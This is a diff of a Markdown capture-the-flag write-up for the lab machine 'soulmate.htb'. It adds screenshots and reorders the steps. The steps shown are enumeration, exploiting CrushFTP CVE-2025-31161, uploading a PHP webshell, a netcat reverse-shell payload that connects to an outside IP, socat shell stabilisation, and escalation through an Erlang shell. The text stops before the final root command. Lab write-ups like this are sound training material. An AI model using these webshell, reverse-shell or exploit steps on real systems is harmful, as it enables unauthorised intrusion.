@@ -16,6 +16,8 @@ nmap -Pn <target> -sC -sV -v -oN nmap_sVsC.txt && sleep 5 && \
 nmap -T5 -Pn <target> -v --script vuln -oN nmap_vuln.txt
 ```
 
+![Alt text for your image](images/image34.png)
+
 -----
 
 ## 🌐 Web Enumeration
@@ -26,11 +28,16 @@ nmap -T5 -Pn <target> -v --script vuln -oN nmap_vuln.txt
 ffuf -w /opt/useful/seclists/Discovery/Web-Content/raft-medium-directories.txt:FUZZ -u http://soulmate.htb/FUZZ -s
 ```
 
+
+![Alt text for your image](images/image14.png)
+
 ### Subdomain brute forcing
 
 ```bash
 ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.129.84.47/ -H 'Host: FUZZ.soulmate.htb' -fs 154
 ```
+
+![Alt text for your image](images/image20.png)
 
 -----
 
@@ -38,11 +45,17 @@ ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ 
 
 The domain `ftp.soulmate.htb` resolves to a CrushFTP web interface.
 
+
+![Alt text for your image](images/image19.png)
+
 The version string found:
 
 ```
 11.W.657-2025_03_08_07_52
 ```
+
+
+![Alt text for your image](images/image18.png)
 
 This version is vulnerable to CVE-2025-31161:
 
@@ -54,9 +67,98 @@ This version is vulnerable to CVE-2025-31161:
 python cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user test --password admin123
 ```
 
-After exploitation, we can access:
+![Alt text for your image](images/image6.png)
+
+
+After exploitation, we can access with our new credentials:
 
 `http://ftp.soulmate.htb/WebInterface/UserManager/index.html`
+
+
+![Alt text for your image](images/image17.png)
+
+Then we find the users and see that we can change their password, after checking i found that ben has access to the folder where the soulmate app is running so we exploit and login to that account
+
+![Alt text for your image](images/image8.png)
+
+![Alt text for your image](images/image5.png)
+
+
+-----
+
+-----
+
+## ⚡ Web Shell Access
+
+Upload a PHP webshell:
+
+```php
+<?=`$_GET[0]`?>
+```
+
+Then from the soulmate.htb webapp we see that we can rce
+
+![Alt text for your image](images/image7.png)
+
+Trigger a reverse shell:
+
+```
+http://soulmate.htb/shell.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.10.15.30%204444%20%3E%2Ftmp%2Ff
+```
+
+![Alt text for your image](images/image17.png)
+
+![Alt text for your image](images/image15.png)
+
+
+-----
+
+## 🔧 Shell Stabilization
+
+```bash
+chmod +x socatx64.bin
+./socatx64.bin exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.14:4444
+```
+
+-----
+
+## 📉 Deadend Enumeration
+
+Some enumeration paths don’t yield privilege escalation.
+
+We checked the config file where there was a hardcoded admin password
+
+![Alt text for your image](images/image21.png)
+
+![Alt text for your image](images/image13.png)
+
+But after logging in we didn't find anything useful and any path to escalate
+
+![Alt text for your image](images/image12.png)
+
+
+
+-----
+
+## 📜 Privesc search with linpeas
+
+![Alt text for your image](images/image22.png)
+
+
+![Alt text for your image](images/image2.png)
+
+A key file is found:
+
+```bash
+cat /usr/local/lib/erlang_login/start.escript
+```
+
+
+![Alt text for your image](images/image11.png)
+
+
+![Alt text for your image](images/image23.png)
+
 
 -----
 
@@ -76,58 +178,28 @@ su ben
 Password: HouseH0ldings998
 ```
 
------
-
-## ⚡ Web Shell Access
-
-Upload a PHP webshell:
-
-```php
-<?=`$_GET[0]`?>
-```
-
-Trigger a reverse shell:
-
-```
-http://soulmate.htb/shell.php?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|sh%20-i%202%3E%261|nc%2010.10.15.30%204444%20%3E%2Ftmp%2Ff
-```
-
------
-
-## 🔧 Shell Stabilization
-
-```bash
-chmod +x socatx64.bin
-./socatx64.bin exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.14:4444
-```
-
------
-
-## 📉 Deadend Enumeration
-
-Some enumeration paths don’t yield privilege escalation.
-
------
-
-## 📜 Erlang Script Discovery
-
-A key file is found:
-
-```bash
-cat /usr/local/lib/erlang_login/start.escript
-```
-
------
-
 ## 🏁 User Flag
 
 The user flag is captured.
+
+![Alt text for your image](images/image1.png)
 
 -----
 
 ## 🧪 Root Exploitation with Erlang
 
+Then based on the script we ssh into the  localhost 2222 port, based on what the script was doing
+
+![Alt text for your image](images/image3.png)
+
+
+![Alt text for your image](images/image3.png)
+
+We then discover a shell, after research i found that it is an erlang shelll and also learnt the syntax to execute on the machine
+
 By experimenting with Erlang command execution:
+
+![Alt text for your image](images/image9.png)
 
 Final command for root flag:
 
